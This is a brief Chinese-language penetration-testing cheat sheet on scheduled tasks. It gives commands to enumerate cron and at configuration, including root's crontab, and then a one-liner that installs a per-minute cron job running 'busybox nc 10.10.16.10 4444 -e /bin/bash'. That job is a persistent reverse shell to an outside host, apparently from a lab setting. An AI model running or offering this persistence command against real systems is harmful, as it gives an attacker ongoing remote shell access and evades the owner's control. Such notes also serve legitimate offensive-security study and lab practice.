# 配置信息检索

## 计划任务

### 查看计划任务

```bash
cat /etc/crontab
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

### 快速创建计划任务

```bash
# 为当前用户快速创建计划任务
(crontab -l 2>/dev/null; echo "* * * * * busybox nc 10.10.16.10 4444 -e /bin/bash") | crontab -
```
